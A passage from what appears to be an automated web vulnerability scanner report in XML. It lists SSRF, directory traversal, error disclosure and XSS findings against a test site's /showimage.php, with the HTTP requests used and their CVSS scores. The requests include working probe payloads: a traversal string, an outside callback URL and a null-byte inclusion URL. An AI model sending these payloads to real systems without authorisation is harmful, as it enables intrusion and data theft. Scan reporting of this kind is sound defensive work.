          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no loss of integrity within the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[PHP Runtime Configuration]]></Database>
          <URL><![CDATA[http://www.php.net/manual/en/errorfunc.configuration.php#ini.display-errors]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="34" color="red">
       <Name><![CDATA[Server side request forgery]]></Name>
       <ModuleName><![CDATA[Scripting (Server_Side_Request_Forgery.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">file</font></b> was set to <b><font color="dark">http://hit0kK0thl6Wd.bxss.me/</font></b><br/><br/>An HTTP request was initiated for the domain <b>hit0kK0thl6Wd.bxss.me </b> which indicates that this script is vulnerable to SSRF (Server Side Request Forgery).<br/><br/>HTTP request details: <br/><pre wrap="virtual">IP address: 176.28.50.165
User agent: 
</pre>]]></Details>
       <Affects><![CDATA[/showimage.php]]></Affects>
       <Parameter><![CDATA[file]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Configuration]]></Type>
       <Impact><![CDATA[The impact varies according to the affected server interface.]]></Impact>
       <Description><![CDATA[SSRF as in Server Side Request Forgery is a vulnerability that allows an attacker to force server interfaces into sending packets initiated by the victim server to the local interface or to another server behind the firewall. Consult Web References for more information about this problem.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should properly sanitize user input.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /showimage.php?file=http://hit0kK0thl6Wd.bxss.me/ HTTP/1.1
Cookie: mycookie=3
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Mon, 02 Feb 1970 21:46:57 GMT
Content-Type: image/jpeg
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Content-Length: 1853
]]></Response>
       </TechnicalDetails>
       <CWE id="918"><![CDATA[CWE-918]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:M/Au:N/C:P/I:P/A:N]]></Descriptor>
          <Score><![CDATA[5.8]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Medium]]></AC>
          <ACdesc><![CDATA[The access conditions are somewhat specialized.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H]]></Descriptor>
          <Score><![CDATA[9]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[High]]></AC>
          <ACdesc><![CDATA[A successful attack depends on conditions beyond the attacker's control. That is, a successful attack cannot be accomplished at will, but requires the attacker to invest in some measurable amount of effort in preparation or execution against the vulnerable component before a successful attack can be expected.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Changed]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can affect resources beyond the authorization privileges intended by the vulnerable component. In this case the vulnerable component and the impacted component are different.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[High]]></I>
          <Idesc><![CDATA[There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component.]]></Idesc>
          <A><![CDATA[High]]></A>
          <Adesc><![CDATA[There is total loss of availability, resulting in the attacker being able to fully deny access to resources in the impacted component; this loss is either sustained (while the attacker continues to deliver the attack) or persistent (the condition persists even after the attack has completed).]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[SSRF VS. BUSINESS-CRITICAL APPLICATIONS]]></Database>
          <URL><![CDATA[https://media.blackhat.com/bh-us-12/Briefings/Polyakov/BH_US_12_Polyakov_SSRF_Business_Slides.pdf]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="35" color="red">
       <Name><![CDATA[Directory traversal (verified)]]></Name>
       <ModuleName><![CDATA[Scripting (Directory_Traversal.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">file</font></b> was set to <b><font color="dark">1ACUSTARTFILE/../../xxx\..\..\ACUENDFILE</font></b>]]></Details>
       <Affects><![CDATA[/showimage.php]]></Affects>
       <Parameter><![CDATA[file]]></Parameter>
       <AOP_SourceFile><![CDATA[/hj/var/www//showimage.php]]></AOP_SourceFile>
       <AOP_SourceLine>19</AOP_SourceLine>
       <AOP_Additional><![CDATA[File: 1ACUSTARTFILE/../../xxx\..\..\ACUENDFILE.tn
&quot;fopen&quot; was called.]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[By exploiting directory traversal vulnerabilities, attackers step out of the root directory and access files in other directories. As a result, attackers might view restricted files or execute commands, leading to a full compromise of the Web server.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to directory traversal attacks.<br/><br/>Directory Traversal is a vulnerability which allows attackers to access restricted directories and execute commands outside of the web server's root directory.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /showimage.php?file=1ACUSTARTFILE/../../xxx%5c..%5c..%5cACUENDFILE&amp;size=160 HTTP/1.1
Acunetix-Aspect-Password: 082119f75623eb7abd7bf357698ff66c
Acunetix-Aspect: enabled
Referer: http://testphp.vulnweb.com/
Cookie: mycookie=3
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Mon, 02 Feb 1970 21:46:58 GMT
Content-Type: image/jpeg
Content-Length: 138
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
]]></Response>
       </TechnicalDetails>
       <CWE id="22"><![CDATA[CWE-22]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:M/Au:N/C:P/I:P/A:P]]></Descriptor>
          <Score><![CDATA[6.8]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Medium]]></AC>
          <ACdesc><![CDATA[The access conditions are somewhat specialized.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[Partial]]></A>
          <Adesc><![CDATA[There is reduced performance or interruptions in resource availability.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.3]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[Low]]></C>
          <Cdesc><![CDATA[There is some loss of confidentiality. Access to some restricted information is obtained, but the attacker does not have control over what information is obtained, or the amount or kind of loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no loss of integrity within the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix Directory Traversal Attacks]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/directory-traversal.htm]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="36" color="orange">
       <Name><![CDATA[Application error message]]></Name>
       <ModuleName><![CDATA[Scripting (Error_Message.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">file</font></b> was set to <b><font color="dark"></font></b><br/>Error message found: <pre wrap="virtual"><font color="blue">Warning: fopen(): Unable to access .tn in /hj/var/www/showimage.php on line 19

Warning: fopen(.tn): failed to open stream: No such file or directory in /hj/var/www/showimage.php on line 19</font></pre>]]></Details>
       <Affects><![CDATA[/showimage.php]]></Affects>
       <Parameter><![CDATA[file]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[The error messages may disclose sensitive information. This information can be used to launch further attacks.]]></Impact>
       <Description><![CDATA[This page contains an error/warning message that may disclose sensitive information. The message can also contain the location of the file that produced the unhandled exception.<br/><br/>
This may be a false positive if the error message is found in documentation pages.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Review the source code for this script.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /showimage.php?file=&amp;size=160 HTTP/1.1
Referer: http://testphp.vulnweb.com/
Cookie: mycookie=3
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Mon, 02 Feb 1970 21:47:00 GMT
Content-Type: image/jpeg
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Content-Length: 303
]]></Response>
       </TechnicalDetails>
       <CWE id="200"><![CDATA[CWE-200]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N]]></Descriptor>
          <Score><![CDATA[7.5]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no loss of integrity within the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[PHP Runtime Configuration]]></Database>
          <URL><![CDATA[http://www.php.net/manual/en/errorfunc.configuration.php#ini.display-errors]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="37" color="red">
       <Name><![CDATA[Cross site scripting]]></Name>
       <ModuleName><![CDATA[Scripting (Remote_File_Inclusion_XSS.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">file</font></b> was set to <b><font color="dark">http://testasp.vulnweb.com/t/xss.html?%00.jpg</font></b>]]></Details>
       <Affects><![CDATA[/showimage.php]]></Affects>
       <Parameter><![CDATA[file]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[Malicious users may inject JavaScript, VBScript, ActiveX, HTML or Flash into a vulnerable application to fool a user in order to gather data from them.
An attacker can steal the session cookie and take over the account, impersonating the user.
It is also possible to modify the content of the page presented to the user.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to Cross Site Scripting (XSS) attacks.<br/><br/>
Cross site scripting (also referred to as XSS) is a vulnerability that allows an attacker to send malicious code (usually in the form of Javascript) to another user.
Because a browser cannot know if the script should be trusted or not, it will execute the script in the user context allowing the attacker to access any cookies or session tokens retained by the browser.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from The Cross Site Scripting FAQ - http://www.cgisecurity.com/articles/xss-faq.shtml </i> 

<h2>Introduction</h2>

<p>Websites today are more complex than ever, containing a lot of dynamic content making the experience for the user more enjoyable. Dynamic content is achieved through the use of web applications which can deliver different output to a user depending on their settings and needs. Dynamic websites suffer from a threat that static websites don't, called &quot;Cross Site Scripting&quot; (or XSS dubbed by other security professionals). Currently small informational tidbits about Cross Site Scripting holes exist but none really explain them to an average person or administrator. This FAQ was written to provide a better understanding of this emerging threat, and to give guidance on detection and prevention.</p>

<h2>&quot;What is Cross Site Scripting?&quot;</h2>

<p>Cross site scripting (also known as XSS) occurs when a web application gathers malicious data from a user. The data is usually gathered in the form of a hyperlink which contains malicious content within it. The user will most likely click on this link from another website, instant message, or simply just reading a web board or email message. Usually the attacker will encode the malicious portion of the link to the site in HEX (or other encoding methods) so the request is less suspicious looking to the user when clicked on. After the data is collected by the web application, it creates an output page for the user containing the malicious data that was originally sent to it, but in a manner to make it appear as valid content from the website. Many popular guestbook and forum programs allow users to submit posts with html and javascript embedded in them. If for example I was logged in as &quot;john&quot; and read a message by &quot;joe&quot; that contained malicious javascript in it, then it may be possible for &quot;joe&quot; to hijack my session just by reading his bulletin board post. Further details on how attacks like this are accomplished via &quot;cookie theft&quot; are explained in detail below.</p>

<h2>&quot;What does XSS and CSS mean?&quot;</h2>

<p>Often people refer to Cross Site Scripting as CSS. There has been a lot of confusion with Cascading Style Sheets (CSS) and cross site scripting. Some security people refer to Cross Site Scripting as XSS. If you hear someone say &quot;I found a XSS hole&quot;, they are talking about Cross Site Scripting for certain.</p>


<h2>&quot;What are the threats of Cross Site Scripting?&quot;</h2>

<p>Often attackers will inject JavaScript, VBScript, ActiveX, HTML, or Flash into a vulnerable application to fool a user (Read below for further details) in order to gather data from them. Everything from account hijacking, changing of user settings, cookie theft/poisoning, or false advertising is possible. New malicious uses are being found every day for XSS attacks. The post below by Brett Moore brings up a good point with regard to &quot;Denial Of Service&quot;, and potential &quot;auto-attacking&quot; of hosts if a user simply reads a post on a message board.</p>

<h2>&quot;What can I do to protect myself as a vendor?&quot;</h2>

<p>This is a simple answer. Never trust user input and always filter metacharacters. This will eliminate the majority of XSS attacks. Converting &lt; and &gt; to &amp;lt; and &amp;gt; is also suggested when it comes to script output. Remember XSS holes can be damaging and costly to your business if abused. Often attackers will disclose these holes to the public, which can erode customer and public confidence in the security and privacy of your organization's site. Filtering &lt; and &gt; alone will not solve all cross site scripting attacks and it is suggested you also attempt to filter out ( and ) by translating them to &amp;#40; and &amp;#41;, and also # and &amp; by translating them to &amp;#35 (#) and &amp;#38 (&amp;).</p>

<h2>&quot;What can I do to protect myself as a user?&quot;</h2>

<p>The easiest way to protect yourself as a user is to only follow links from the main website you wish to view. If you visit one website and it links to CNN for example, instead of clicking on it visit CNN's main site and use its search engine to find the content. This will probably eliminate ninety percent of the problem. Sometimes XSS can be executed automatically when you open an email, email attachment, read a guestbook, or bulletin board post. If you plan on opening an email, or reading a post on a public board from a person you don't know BE CAREFUL. One of the best ways to protect yourself is to turn off Javascript in your browser settings. In IE turn your security settings to high. This can prevent cookie theft, and in general is a safer thing to do.</p>

<h2>&quot;How common are XSS holes?&quot;</h2>

<p>Cross site scripting holes are gaining popularity among hackers as easy holes to find in large websites. Websites from FBI.gov, CNN.com, Time.com, Ebay, Yahoo, Apple computer, Microsoft, Zdnet, Wired, and Newsbytes have all had one form or another of XSS bugs.</p>

<p>Every month roughly 10-25 XSS holes are found in commercial products and advisories are published explaining the threat.</p>


<h2>&quot;Does encryption protect me?&quot;</h2>

<p>Websites that use SSL (https) are in no way more protected than websites that are not encrypted. The web applications work the same way as before, except the attack is taking place in an encrypted connection. People often think that because they see the lock on their browser it means everything is secure. This just isn't the case.</p>


<h2>&quot;Can XSS holes allow command execution?&quot;</h2>

<p>XSS holes can allow Javascript insertion, which may allow for limited execution. If an attacker were to exploit a browser flaw (browser hole) it could then be possible to execute commands on the client's side. If command execution were possible it would only be possible on the client side. In simple terms XSS holes can be used to help exploit other holes that may exist in your browser.</p>


<h2>&quot;What if I don't feel like fixing a CSS/XSS Hole?&quot;</h2>

<p>By not fixing an XSS hole this could allow possible user account compromise in portions of your site as they get added or updated. Cross Site Scripting has been found in various large sites recently and have been widely publicized. Left unrepaired, someone may discover it and publish a warning about your company. This may damage your company's reputation, depicting it as being lax on security matters. This of course also sends the message to your clients that you aren't dealing with every problem that arises, which turns into a trust issue. If your client doesn't trust you why would they wish to do business with you?</p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /showimage.php?file=http://testasp.vulnweb.com/t/xss.html%3f%2500.jpg&amp;size=160 HTTP/1.1
Cookie: mycookie=3
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Mon, 02 Feb 1970 21:47:08 GMT
Content-Type: image/jpeg
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Content-Length: 33
]]></Response>
       </TechnicalDetails>
       <CWE id="79"><![CDATA[CWE-79]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:P/A:N]]></Descriptor>
          <Score><![CDATA[6.4]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N]]></Descriptor>
          <Score><![CDATA[5.3]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no loss of confidentiality within the impacted component.]]></Cdesc>
          <I><![CDATA[Low]]></I>
          <Idesc><![CDATA[Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is constrained. The data modification does not have a direct, serious impact on the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix Cross Site Scripting Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/cross-site-scripting.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: How Cross-Site Scripting (XSS) Works]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-how-cross-site-scripting-xss-works/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[The Cross Site Scripting Faq]]></Database>
          <URL><![CDATA[http://www.cgisecurity.com/xss-faq.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Cross Site Scripting]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Cross_Site_Scripting]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[XSS Annihilation]]></Database>
          <URL><![CDATA[http://ha.ckers.org/blog/20060602/xss-annihilation/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[XSS Filter Evasion Cheat Sheet]]></Database>
          <URL><![CDATA[https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[Cross site scripting]]></Database>
          <URL><![CDATA[http://en.wikipedia.org/wiki/Cross-site_scripting ]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
        <Reference>
